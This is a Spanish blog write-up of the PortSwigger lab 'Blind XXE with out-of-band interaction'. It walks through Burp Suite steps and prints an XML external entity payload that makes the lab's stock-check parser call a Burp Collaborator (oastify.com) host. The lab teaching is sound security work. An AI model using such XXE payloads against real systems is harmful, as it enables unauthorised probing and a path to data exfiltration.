---
layout: single
title: Blind XXE with out-of-band interaction – PortSwigger Write Up
excerpt: "En este post vamos a estar resolviendo el laboratorio de PortSwigger: “Blind XXE with out-of-band interaction."
date: 2022-10-16
classes: wide
#header:
#  teaser: /assets/images/portswigger/stored_xss_into_html_context_with_nothing_encoded/portada.png
#  teaser_home_page: true
categories:
  - Portswigger
tags:
  - XML injection
  - Practitioner
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: "Blind XXE with out-of-band interaction."

## Pasos

Este laboratorio tiene una función "Check stock" que analiza la entrada XML pero no muestra el resultado.

Puede detectar la vulnerabilidad ciega XXE activando interacciones fuera de banda con un dominio externo.

Para resolver el laboratorio, use una entidad externa para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/1.png" width="1000">
</p><br>

Vemos que en esta situación es una tienda donde podemos ver los detalles de los productos y si nos fijamos podemos ver el stock de cada uno de los productos.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/2.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/3.png" width="1000">
</p><br>

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en Check stock y buscamos el paquete en el Http history y lo enviamos al `Repeater`.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/4.png" width="1000">
</p><br>

Entonces ahora lo que haremos será inciar el Burp collaborator y `copiar del clipboard`.

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/5.png" width="1000">
</p><br>


<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/6.png" width="1000">
</p><br>


Con el clipboard copiado haremos una consulta con el siguiente payload basado en la escructura XML del paquete.

```plaintext
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://oia2c1s73e4ujtg4ox18wbx8czip6e.oastify.com/testXXE"> ]>
<stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
</stockCheck>
```

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/7.png" width="1000">
</p><br>

Como podemos ver, se realizó la consulta al sitio web generado con Burp Collaborator, aunque no existió ninguna respuesta por lado del servidor mas que el error de `Invalid product ID`. Entramos al `home` 
del laboratorio desde el navegador para verificar que completamos el laboratorio.


<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/9.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/blind_xxe_with_out_of_band_interaction/10.png" width="1000">
</p><br>


¡Un saludo y espero que os sirva de apoyo!
